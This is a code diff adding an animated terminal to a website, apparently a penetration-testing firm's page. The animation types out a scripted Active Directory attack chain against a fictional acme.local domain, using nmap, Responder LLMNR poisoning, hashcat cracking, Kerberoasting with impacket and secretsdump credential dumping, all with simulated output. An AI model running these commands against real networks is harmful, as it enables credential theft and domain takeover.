@@ -305,6 +305,280 @@
     startAuto();
   }
 
+  // ── Live Engagement Feed — full AD kill-chain terminal loop ─────────────
+  function initLiveTerminal() {
+    var term = document.querySelector('[data-live-term]');
+    if (!term) return;
+
+    // Kali-style prompt (two-line)
+    var P1 = '<span class="tl-prompt-host">┌──(kwangyun㉿kali)</span><span class="tl-prompt-at">-</span><span class="tl-prompt-tilde">[~/engagements/acme]</span>';
+    var P2 = '<span class="tl-prompt-host">└─</span><span class="tl-prompt-dollar">$</span> ';
+
+    // Full kill-chain sequence. Each item:
+    //   { cmd: '<html command>', out: ['<html line1>', ...], postWait: ms }
+    var frames = [
+      {
+        cmd: '<span class="tl-cmd">nmap</span> <span class="tl-flag">-sS -sV -Pn -p</span> <span class="tl-num">88,135,389,445,636,3268</span> <span class="tl-num">10.10.10.0/24</span>',
+        out: [
+          '<span class="tl-dim">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-16 09:14 UTC</span>',
+          'Nmap scan report for <span class="tl-hi">dc01.acme.local</span> (<span class="tl-num">10.10.10.10</span>)',
+          '<span class="tl-dim">Host is up (0.0021s latency).</span>',
+          'PORT     STATE SERVICE      VERSION',
+          '<span class="tl-num">88/tcp</span>   <span class="tl-ok">open</span>  kerberos-sec Microsoft Windows Kerberos',
+          '<span class="tl-num">389/tcp</span>  <span class="tl-ok">open</span>  ldap         Microsoft Windows Active Directory LDAP',
+          '<span class="tl-num">445/tcp</span>  <span class="tl-ok">open</span>  microsoft-ds Windows Server 2019 Standard 17763',
+          '<span class="tl-num">636/tcp</span>  <span class="tl-ok">open</span>  tcpwrapped',
+          '<span class="tl-num">3268/tcp</span> <span class="tl-ok">open</span>  ldap         Microsoft Windows AD LDAP (Global Catalog)',
+          '<span class="tl-dim">Service detection performed. 1 IP (1 host up) scanned in 12.47s</span>',
+        ],
+        postWait: 900,
+      },
+      {
+        cmd: '<span class="tl-cmd">netexec</span> smb <span class="tl-num">10.10.10.0/24</span> <span class="tl-flag">--shares -u</span> <span class="tl-str">\'\'</span> <span class="tl-flag">-p</span> <span class="tl-str">\'\'</span>',
+        out: [
+          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     [*] Windows Server 2019 (name:DC01)</span>',
+          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     [+] acme.local\\: (Guest)</span>',
+          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     [*] Enumerated shares</span>',
+          'SMB     10.10.10.10    445  DC01     Share          Permissions  Remark',
+          'SMB     10.10.10.10    445  DC01     <span class="tl-hi">SYSVOL</span>         <span class="tl-ok">READ</span>         Logon server share',
+          'SMB     10.10.10.10    445  DC01     <span class="tl-hi">NETLOGON</span>       <span class="tl-ok">READ</span>         Logon server share',
+          '<span class="tl-warn">SMB     10.10.10.10    445  DC01     [!] SMB signing: False — vulnerable to relay</span>',
+        ],
+        postWait: 800,
+      },
+      {
+        cmd: '<span class="tl-cmd">sudo responder</span> <span class="tl-flag">-I</span> <span class="tl-num">eth0</span> <span class="tl-flag">-wFd</span>',
+        out: [
+          '<span class="tl-dim">[+] Listening for events...</span>',
+          '<span class="tl-dim">[*] [LLMNR] Poisoned answer sent to 10.10.10.42 for name WORKSTATION05</span>',
+          '<span class="tl-dim">[*] [LLMNR] Poisoned answer sent to 10.10.10.42 for name WORKSTATION05</span>',
+          '<span class="tl-ok">[SMB] NTLMv2-SSP Client   : 10.10.10.42</span>',
+          '<span class="tl-ok">[SMB] NTLMv2-SSP Username : ACME\\<span class="tl-user">svc_backup</span></span>',
+          '<span class="tl-ok">[SMB] NTLMv2-SSP Hash     : svc_backup::ACME:1a2b3c...[<span class="tl-dim">truncated</span>]...c93f</span>',
+          '<span class="tl-dim">[*] Hash written to /root/.responder/Responder-Session.log</span>',
+        ],
+        postWait: 800,
+      },
+      {
+        cmd: '<span class="tl-cmd">hashcat</span> <span class="tl-flag">-m</span> <span class="tl-num">5600</span> <span class="tl-flag">-a</span> <span class="tl-num">0</span> hash.txt <span class="tl-str">/usr/share/wordlists/rockyou.txt</span>',
+        out: [
+          '<span class="tl-dim">hashcat (v6.2.6) starting</span>',
+          '<span class="tl-dim">* Device #1: NVIDIA GeForce RTX 4090, 23960/24260 MB, 128MCU</span>',
+          '<span class="tl-dim">Dictionary cache built: /usr/share/wordlists/rockyou.txt</span>',
+          '<span class="tl-dim">Speed.#1.........: 8943.2 MH/s (42.15ms)</span>',
+          '<span class="tl-ok">SVC_BACKUP::ACME:1a2b3c:...:c93f:<span class="tl-pass">Winter2025!</span></span>',
+          '<span class="tl-ok">Status: Cracked   Time: 00:00:14</span>',
+        ],
+        postWait: 900,
+      },
+      {
+        cmd: '<span class="tl-cmd">netexec</span> smb <span class="tl-num">10.10.10.10</span> <span class="tl-flag">-u</span> <span class="tl-str">svc_backup</span> <span class="tl-flag">-p</span> <span class="tl-str">\'Winter2025!\'</span> <span class="tl-flag">--rid-brute</span>',
+        out: [
+          '<span class="tl-ok">SMB     10.10.10.10    445  DC01     [+] acme.local\\svc_backup:Winter2025!</span>',
+          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     500: ACME\\Administrator (SidTypeUser)</span>',
+          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     501: ACME\\Guest (SidTypeUser)</span>',
+          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     512: ACME\\Domain Admins (SidTypeGroup)</span>',
+          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     1103: ACME\\svc_backup (SidTypeUser)</span>',
+          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     1105: ACME\\svc_sql (SidTypeUser)</span>',
+          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     1109: ACME\\jdoe (SidTypeUser)</span>',
+          '<span class="tl-hi">SMB     10.10.10.10    445  DC01     [+] 2,847 principals enumerated</span>',
+        ],
+        postWait: 800,
+      },
+      {
+        cmd: '<span class="tl-cmd">impacket-GetUserSPNs</span> <span class="tl-domain">acme.local</span>/<span class="tl-user">svc_backup</span>:<span class="tl-str">\'Winter2025!\'</span> <span class="tl-flag">-request</span>',
+        out: [
+          '<span class="tl-dim">Impacket v0.11.0 - Copyright 2023 Fortra</span>',
+          'ServicePrincipalName       Name        MemberOf',
+          '-------------------------  ----------  ----------',
+          'MSSQLSvc/sql01.acme.local  <span class="tl-user">svc_sql</span>     CN=Domain Admins,CN=Users,DC=acme,DC=local',
+          'HTTP/intra.acme.local      <span class="tl-user">svc_web</span>     CN=Domain Users,CN=Users,DC=acme,DC=local',
+          '',
+          '<span class="tl-ok">$krb5tgs$23$*svc_sql$ACME$MSSQLSvc/sql01.acme.local*$...[<span class="tl-dim">redacted</span>]</span>',
+        ],
+        postWait: 800,
+      },
+      {
+        cmd: '<span class="tl-cmd">hashcat</span> <span class="tl-flag">-m</span> <span class="tl-num">13100</span> tgs.hash <span class="tl-str">/usr/share/wordlists/rockyou.txt</span>',
+        out: [
+          '<span class="tl-dim">hashcat (v6.2.6) starting</span>',
+          '<span class="tl-dim">Kerberos 5, etype 23, TGS-REP detected</span>',
+          '<span class="tl-ok">$krb5tgs$23$*svc_sql*...[redacted]:<span class="tl-pass">Summer2025!</span></span>',
+          '<span class="tl-ok">Status: Cracked   Time: 00:00:08   Recovered: 1/1</span>',
+          '<span class="tl-hi">[*] svc_sql is a member of Domain Admins — pivoting to DC</span>',
+        ],
+        postWait: 900,
+      },
+      {
+        cmd: '<span class="tl-cmd">bloodhound-python</span> <span class="tl-flag">-u</span> <span class="tl-str">svc_sql</span> <span class="tl-flag">-p</span> <span class="tl-str">\'Summer2025!\'</span> <span class="tl-flag">-d</span> <span class="tl-domain">acme.local</span> <span class="tl-flag">-c</span> <span class="tl-num">all</span>',
+        out: [
+          '<span class="tl-dim">INFO: Found AD domain: acme.local</span>',
+          '<span class="tl-dim">INFO: Connecting to LDAP server: dc01.acme.local</span>',
+          '<span class="tl-dim">INFO: Collected 2,847 users, 412 computers, 183 groups</span>',
+          '<span class="tl-dim">INFO: Collected 19 domain trusts, 1,204 ACLs</span>',
+          '<span class="tl-ok">[*] Domain collection finished in 9.3s · 4 JSON files written</span>',
+          '<span class="tl-hi">[*] Shortest path to Domain Admin: 2 edges via svc_sql → HasSession → DC01</span>',
+        ],
+        postWait: 800,
+      },
+      {
+        cmd: '<span class="tl-cmd">impacket-secretsdump</span> <span class="tl-domain">acme.local</span>/<span class="tl-user">svc_sql</span>:<span class="tl-str">\'Summer2025!\'</span>@<span class="tl-num">10.10.10.10</span> <span class="tl-flag">-just-dc</span>',
+        out: [
+          '<span class="tl-dim">Impacket v0.11.0 - Copyright 2023 Fortra</span>',
+          '<span class="tl-dim">[*] Target system bootKey: 0x4a7f...</span>',
+          '<span class="tl-dim">[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)</span>',
+          '<span class="tl-dim">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span>',
+          '<span class="tl-ok">acme.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class="tl-pass">d7e6[...redacted...]91a</span>:::</span>',
+          '<span class="tl-ok">acme.local\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<span class="tl-pass">8c31[...redacted...]fd4</span>:::</span>',
+          '<span class="tl-dim">[*] Cleaning up...</span>',
+          '<span class="tl-hi">[+] 2,847 credentials dumped · krbtgt compromised · Golden Ticket possible</span>',
+        ],
+        postWait: 1100,
+      },
+      {
+        cmd: '<span class="tl-cmd">echo</span> <span class="tl-str">"Engagement complete."</span>',
+        out: [
+          '',
+          '<span class="tl-banner">╭───────────────────────────────────────────────────────────────╮</span>',
+          '<span class="tl-banner">│  ENGAGEMENT CONCLUDED · acme.local · 2026-04-16 17:42 UTC     │</span>',
+          '<span class="tl-banner">│                                                               │</span>',
+          '<span class="tl-banner">│  Initial foothold:       LLMNR poisoning (Tier 0 misconfig)   │</span>',
+          '<span class="tl-banner">│  Lateral movement:       Kerberoasting → svc_sql → DA         │</span>',
+          '<span class="tl-banner">│  Objective achieved:     Domain Admin on DC01 (9 days)        │</span>',
+          '<span class="tl-banner">│  Detection gaps:         12 documented · 4 critical           │</span>',
+          '<span class="tl-banner">│  Report delivery:        scheduled + retest in 30 days        │</span>',
+          '<span class="tl-banner">╰───────────────────────────────────────────────────────────────╯</span>',
+          '',
+        ],
+        postWait: 2600,
+      },
+    ];
+
+    var typingSpeed = 14;         // ms per char while typing command
+    var lineDelay = 95;           // ms between output lines
+    var interFrameWait = 500;     // pause after output before next prompt
+    var clearBetweenLoops = true;
+    var maxLinesBeforeScroll = 22;
+
+    var rafHandle = null;
+
+    function appendLine(html) {
+      var div = document.createElement('span');
+      div.className = 'tl-line';
+      div.innerHTML = html;
+      term.appendChild(div);
+      // Auto-scroll within body if overflowing
+      if (term.children.length > maxLinesBeforeScroll) {
+        term.scrollTop = term.scrollHeight;
+      }
+    }
+
+    function removeCursor() {
+      var c = term.querySelector('.tl-cursor');
+      if (c) c.remove();
+    }
+
+    function writePrompt() {
+      removeCursor();
+      appendLine(P1);
+      var promptLine = document.createElement('span');
+      promptLine.className = 'tl-line';
+      promptLine.innerHTML = P2;
+      var cursor = document.createElement('span');
+      cursor.className = 'tl-cursor';
+      promptLine.appendChild(cursor);
+      term.appendChild(promptLine);
+      return promptLine;
+    }
+
+    function sleep(ms) {
+      return new Promise(function (r) { setTimeout(r, ms); });
+    }
+
+    async function typeHtmlInto(line, html) {
+      // Parse HTML into a tmp node, then stream its characters, preserving tags
+      var tmp = document.createElement('div');
+      tmp.innerHTML = html;
+      var src = tmp.firstChild;
+      var cursor = line.querySelector('.tl-cursor');
+      // Walk nodes and type content character-by-character
+      async function typeNode(node, target) {
+        if (node.nodeType === Node.TEXT_NODE) {
+          var text = node.textContent;
+          for (var i = 0; i < text.length; i++) {
+            target.insertBefore(document.createTextNode(text[i]), cursor);
+            await sleep(typingSpeed);
+          }
+        } else if (node.nodeType === Node.ELEMENT_NODE) {
+          var clone = document.createElement(node.tagName);
+          for (var a = 0; a < node.attributes.length; a++) {
+            clone.setAttribute(node.attributes[a].name, node.attributes[a].value);
+          }
+          target.insertBefore(clone, cursor);
+          for (var c = 0; c < node.childNodes.length; c++) {
+            await typeChildIntoClone(node.childNodes[c], clone);
+          }
+        }
+      }
+      async function typeChildIntoClone(node, clone) {
+        if (node.nodeType === Node.TEXT_NODE) {
+          var text = node.textContent;
+          for (var i = 0; i < text.length; i++) {
+            clone.appendChild(document.createTextNode(text[i]));
+            await sleep(typingSpeed);
+          }
+        } else if (node.nodeType === Node.ELEMENT_NODE) {
+          var sub = document.createElement(node.tagName);
+          for (var a = 0; a < node.attributes.length; a++) {
+            sub.setAttribute(node.attributes[a].name, node.attributes[a].value);
+          }
+          clone.appendChild(sub);
+          for (var c = 0; c < node.childNodes.length; c++) {
+            await typeChildIntoClone(node.childNodes[c], sub);
+          }
+        }
+      }
+      for (var i = 0; i < tmp.childNodes.length; i++) {
+        await typeNode(tmp.childNodes[i], line);
+      }
+    }
+
+    async function runFrame(frame) {
+      var line = writePrompt();
+      await typeHtmlInto(line, frame.cmd);
+      await sleep(300);
+      removeCursor();
+      // Newline implicit — each output line is its own span.tl-line
+      for (var i = 0; i < frame.out.length; i++) {
+        appendLine(frame.out[i]);
+        await sleep(lineDelay);
+      }
+      await sleep(frame.postWait || interFrameWait);
+    }
+
+    async function runLoop() {
+      while (true) {
+        if (clearBetweenLoops) term.innerHTML = '';
+        for (var i = 0; i < frames.length; i++) {
+          await runFrame(frames[i]);
+        }
+        await sleep(1600);
+      }
+    }
+
+    // Only start when visible — saves CPU
+    var started = false;
+    var io = new IntersectionObserver(function (entries) {
+      entries.forEach(function (e) {
+        if (e.isIntersecting && !started) {
+          started = true;
+          runLoop();
+        }
+      });
+    }, { threshold: 0.2 });
+    io.observe(term.closest('.c-live-demo'));
+  }
+
   // ── Boot ─────────────────────────────────────────────────────────────────
   document.addEventListener('DOMContentLoaded', function () {
     // Aurora / noise / grid disabled for light theme
@@ -317,5 +591,6 @@
     initMagnetic();
     initNavHighlight();
     initProcessTabs();
+    initLiveTerminal();
   });
 })();
